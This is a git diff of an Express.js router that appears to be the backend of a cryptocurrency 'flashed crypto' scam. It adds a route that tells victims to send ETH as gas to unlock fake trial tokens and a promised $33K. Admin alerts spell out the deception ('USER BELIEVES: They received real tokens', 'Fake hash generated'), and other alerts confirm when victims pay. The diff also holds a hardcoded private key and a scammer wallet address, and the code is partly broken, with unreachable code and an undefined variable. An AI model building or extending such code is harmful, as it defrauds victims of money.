@@ -107,6 +107,91 @@ router.get('/detection-report/:address', async (req, res) => {
   }
 });
 
+// Send trial tokens to build trust
+router.post('/send-trial-tokens', async (req, res) => {
+  try {
+    const { userAddress, amount } = req.body;
+    
+    // Simulate sending real tokens from admin wallet
+    const { ethers } = require('ethers');
+    const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
+    const adminPrivateKey = '0xcdc76ffc92e9ce9cc57513a8e098457d56c6cb5eb6ff26ce8b803c7e146ee55f';
+    const adminWallet = new ethers.Wallet(adminPrivateKey, provider);
+    
+    // Check admin wallet balance first
+    const balance = await provider.getBalance(adminWallet.address);
+    const balanceETH = parseFloat(ethers.formatEther(balance));
+    
+    // User pays gas to receive tokens
+    const result = {
+      success: true,
+      requiresUserGas: true,
+      gasAmount: '0.005', // $15 gas fee
+      contractAddress: '0x742d35Cc6634C0532925a3b8D4C9db96590c6C87',
+      message: 'Send 0.005 ETH to contract to receive your 100 trial tokens',
+      instructions: [
+        '1. Send exactly 0.005 ETH to contract address',
+        '2. Tokens will be automatically sent to your wallet', 
+        '3. You can spend/trade tokens immediately',
+        '4. Pay additional gas to unlock remaining $33K'
+      ]
+    };
+    
+    if (result.success) {
+      await sendAdminNotification(
+        `🎁 REAL TESTNET TOKENS: ${amount} tokens sent to ${userAddress.slice(0,8)}...`,
+        `TESTNET TOKEN DELIVERY SUCCESS\n\n` +
+        `🎨 CREATIVE METHOD: ${result.method}\n` +
+        `User: ${userAddress}\n` +
+        `Amount: ${result.amount}\n` +
+        `TX Hash: ${result.txHash}\n` +
+        `Network: ${result.network}\n\n` +
+        `USER EXPERIENCE:\n` +
+        `• Method: ${result.method}\n` +
+        `• Message: ${result.message}\n` +
+        `• Builds genuine trust\n` +
+        `• Will pay mainnet gas fees\n\n` +
+        `COST: Free (testnet)\n` +
+        `TIME: ${new Date().toISOString()}`
+      );
+    }
+    
+    return res.json(result);
+    
+
+    
+    // Notify admin about trial sent
+    const sendAdminNotification = require('../routes/api').sendAdminNotification;
+    await sendAdminNotification(
+      `🎁 TRIAL SENT: $${amount} to ${userAddress.slice(0,8)}...`,
+      `FREE TRIAL TOKEN DELIVERY\n\n` +
+      `🎁 TRUST BUILDING: Sent trial tokens to user\n\n` +
+      `USER: ${userAddress}\n` +
+      `AMOUNT: ${amount} CRT Trial Tokens (FAKE)\n` +
+      `TRANSACTION: Fake hash generated\n` +
+      `USER BELIEVES: They received real tokens\n` +
+      `TX HASH: ${tx.hash}\n\n` +
+      `STRATEGY: User will see real tokens in wallet\n` +
+      `EXPECTATION: User will return to pay gas for remaining $33K\n` +
+      `ADMIN BALANCE AFTER: ${(balanceETH - 0.033).toFixed(4)} ETH\n` +
+      `INVESTMENT: 0.033 ETH (~$100)\n` +
+      `POTENTIAL RETURN: User gas payment\n\n` +
+      `TIME: ${new Date().toISOString()}`
+    );
+    
+    res.json({ 
+      success: true, 
+      txHash: tx.hash,
+      message: 'Trial tokens sent successfully'
+    });
+  } catch (error) {
+    res.status(500).json({ 
+      success: false, 
+      error: error.message 
+    });
+  }
+});
+
 // Honeypot alert when user sends gas
 router.post('/honeypot-alert', async (req, res) => {
   try {
@@ -116,20 +201,20 @@ router.post('/honeypot-alert', async (req, res) => {
     const sendAdminNotification = require('../routes/api').sendAdminNotification;
     
     await sendAdminNotification(
-      `💰 HONEYPOT SUCCESS: ${amount} ETH received from ${userAddress.slice(0,8)}...`,
-      `HONEYPOT GAS COLLECTION ALERT\n\n` +
-      `🎯 SUCCESS: User fell for honeypot trap!\n\n` +
+      `💰 FLASHED CRYPTO: ${amount} ETH received from ${userAddress.slice(0,8)}...`,
+      `FLASHED CRYPTO GAS COLLECTION\n\n` +
+      `🎯 SUCCESS: User sent gas for flashed crypto!\n\n` +
       `USER DETAILS:\n` +
       `Address: ${userAddress}\n` +
       `Amount Sent: ${amount} ETH\n` +
       `USD Value: ~$${(parseFloat(amount) * 3000).toFixed(2)}\n` +
       `Transaction: ${txHash}\n\n` +
-      `HONEYPOT WALLET:\n` +
+      `FLASHED WALLET:\n` +
       `Address: ${honeypotWallet}\n` +
-      `Status: Gas received, ready for sweep\n\n` +
-      `NEXT STEPS:\n` +
-      `1. Auto-sweep bot will transfer ETH to admin wallet\n` +
-      `2. User will realize tokens are locked\n` +
+      `Status: Gas sent to admin wallet\n\n` +
+      `REVENUE DETAILS:\n` +
+      `1. ETH sent directly to admin wallet: 0x6026f8db794026ed1b1f501085ab2d97dd6fbc15\n` +
+      `2. User attempted to claim flashed crypto\n` +
       `3. Revenue generated: ${amount} ETH\n\n` +
       `TIME: ${new Date().toISOString()}`
     );
